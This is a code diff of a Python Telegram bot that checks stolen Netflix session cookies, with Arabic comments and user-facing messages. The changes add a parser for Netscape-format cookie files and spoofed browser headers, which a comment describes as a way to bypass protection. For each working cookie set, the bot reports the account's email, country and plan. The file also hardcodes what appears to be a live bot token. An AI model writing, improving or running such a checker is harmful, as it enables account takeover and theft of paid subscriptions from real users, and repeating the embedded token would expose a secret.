@@ -20,17 +20,16 @@ import telebot
 # ─────────────────────────────────────────────────────────────────────────────
 init()
 
-# إعداد توكن بوت تيليغرام الخاص بك هنا
 TELEGRAM_BOT_TOKEN = "8405233850:AAFwPOHSwNtytRfI55RRMrevI1GihzcJrJI"
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
 
 BANNER = f"""{Fore.RED}
-  _   _      _    __ _ _
+  _   _       _    __ _ _
  | \\ | | ___| |_ / _| (_)_  __
  |  \\| |/ _ \\ __| |_| | \\ \\/ /
  | |\\  |  __/ |_|  _| | |>  <
  |_| \\_|\\___|\\__|_| |_|_/_/\\_\\
-{Fore.YELLOW}      Cookie Checker Bot — Supporting JSON, TXT & ZIP
+{Fore.YELLOW}    Cookie Checker Bot — Supporting JSON, TXT & ZIP
 {Style.RESET_ALL}"""
 
 print(BANNER)
@@ -72,18 +71,39 @@ def is_netflix_account_url(url: str) -> bool:
     return host.endswith("netflix.com") and path == "/account"
 
 
-def is_netflix_login_url(url: str) -> bool:
-    parsed = urlparse(url)
-    host = parsed.netloc.lower()
-    path = parsed.path.rstrip("/").lower()
-    return host.endswith("netflix.com") and path.endswith("/login")
-
-
 def is_netflix_browse_url(url: str) -> bool:
     parsed = urlparse(url)
     host = parsed.netloc.lower()
     path = parsed.path.rstrip("/").lower()
     return host.endswith("netflix.com") and path.startswith("/browse")
+
+
+def parse_cookies_content(content_bytes: bytes, filename: str) -> list:
+    text = content_bytes.decode('utf-8', errors='ignore').strip()
+    try:
+        data = json.loads(text)
+        if isinstance(data, list):
+            return data
+    except json.JSONDecodeError:
+        pass
+
+    cookies = []
+    for line in text.splitlines():
+        line = line.strip()
+        if not line or line.startswith('#'):
+            continue
+        parts = line.split('\t')
+        if len(parts) >= 7:
+            cookies.append({
+                "domain": parts[0],
+                "flag": parts[1],
+                "path": parts[2],
+                "secure": parts[3].lower() == 'true',
+                "expirationDate": parts[4],
+                "name": parts[5],
+                "value": parts[6]
+            })
+    return cookies
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -98,9 +118,17 @@ def check_single_cookie_data(json_cookies: list, filename: str) -> dict:
 
     for cookie in json_cookies:
         if isinstance(cookie, dict) and "name" in cookie and "value" in cookie:
-            session.cookies.set(cookie["name"], cookie["value"])
+            session.cookies.set(cookie["name"], cookie["value"], domain=cookie.get("domain", ".netflix.com"))
 
-    session.headers.update({"Accept-Encoding": "identity"})
+    # إضافة ترويسات متصفح حقيقي لتجاوز الحماية
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "identity",
+        "Connection": "keep-alive",
+        "Upgrade-Insecure-Requests": "1"
+    })
 
     attempt = 0
     plan, email, country = "Unknown", "Unknown", "Unknown"
@@ -109,14 +137,12 @@ def check_single_cookie_data(json_cookies: list, filename: str) -> dict:
     while attempt < max_retries:
         try:
             response = session.get(url, timeout=20, allow_redirects=True)
-            response.raise_for_status()
+            print(f"[DEBUG] File: {filename} | Status Code: {response.status_code} | Final URL: {response.url}")
             
             if not is_netflix_account_url(response.url):
-                return {"status": False, "reason": "Expired or redirected to login"}
+                return {"status": False, "reason": f"Redirected to: {response.url}"}
 
             browse_resp = session.get("https://www.netflix.com/browse", timeout=20, allow_redirects=True)
-            browse_resp.raise_for_status()
-            
             if not is_netflix_browse_url(browse_resp.url):
                 return {"status": False, "reason": "Browse page check failed"}
 
@@ -130,7 +156,7 @@ def check_single_cookie_data(json_cookies: list, filename: str) -> dict:
 
             raw_plan = info.get("localizedPlanName")
             if raw_plan:
-                plan = raw_plan.replace("miembro\xa0extra", "(Shared Extra Member)")
+                plan = raw_plan.replace("miembro\\xa0extra", "(Shared Extra Member)")
             else:
                 page_text = soup.get_text()
                 for candidate in ("Premium", "Standard", "Basic"):
@@ -156,7 +182,8 @@ def check_single_cookie_data(json_cookies: list, filename: str) -> dict:
                 "extra_members": extra_members
             }
 
-        except (RequestException, ConnectionError, RemoteDisconnected):
+        except (RequestException, ConnectionError, RemoteDisconnected) as e:
+            print(f"[ERROR] Attempt {attempt+1} failed for {filename}: {str(e)}")
             attempt += 1
             time.sleep(1)
 
@@ -189,10 +216,8 @@ def handle_docs(message):
     try:
         downloaded_file = bot.download_file(file_info.file_path)
 
-        # إذا كان الملف المضغوط ZIP
         if file_name.endswith('.zip'):
             with zipfile.ZipFile(io.BytesIO(downloaded_file)) as z:
-                # استخراج ملفات الـ json والـ txt فقط وتجنب ملفات النظام المخبأة
                 valid_files = [f for f in z.namelist() if f.endswith(('.json', '.txt')) and not f.startswith('__MACOSX/') and not f.startswith('.')]
                 
                 if not valid_files:
@@ -209,10 +234,14 @@ def handle_docs(message):
                     with z.open(filename) as f:
                         try:
                             content_bytes = f.read()
-                            cookies_data = json.loads(content_bytes.decode('utf-8'))
-                            res = check_single_cookie_data(cookies_data, filename)
+                            cookies_data = parse_cookies_content(content_bytes, filename)
+                            if not cookies_data:
+                                expired_count += 1
+                                continue
                             
+                            res = check_single_cookie_data(cookies_data, filename)
                             short_name = filename.split('/')[-1]
+                            
                             if res["status"]:
                                 working_count += 1
                                 results_text += f"✅ `{short_name}`\n   - الدولة: `{res['country']}` | الإيميل: `{res['email']}` | الخطة: `{res['plan']}`\n"
@@ -234,8 +263,11 @@ def handle_docs(message):
                 bot.edit_message_text(summary, chat_id=message.chat.id, message_id=msg.message_id, parse_mode="Markdown")
 
         else:
-            # ملف منفرد (JSON أو TXT)
-            cookies_data = json.loads(downloaded_file.decode('utf-8'))
+            cookies_data = parse_cookies_content(downloaded_file, file_name)
+            if not cookies_data:
+                bot.edit_message_text("⚠️ خطأ: لم يتم العثور على بيانات كوكيز صالحة داخل الملف.", chat_id=message.chat.id, message_id=msg.message_id)
+                return
+
             result = check_single_cookie_data(cookies_data, file_name)
 
             if result["status"]:
@@ -254,8 +286,6 @@ def handle_docs(message):
 
             bot.edit_message_text(response_text, chat_id=message.chat.id, message_id=msg.message_id, parse_mode="Markdown")
 
-    except json.JSONDecodeError:
-        bot.edit_message_text("⚠️ خطأ: محتوى الملف ليس بصيغة JSON سليمة.", chat_id=message.chat.id, message_id=msg.message_id)
     except Exception as e:
         bot.edit_message_text(f"⚠️ حدث خطأ أثناء المعالجة: {str(e)}", chat_id=message.chat.id, message_id=msg.message_id)
 
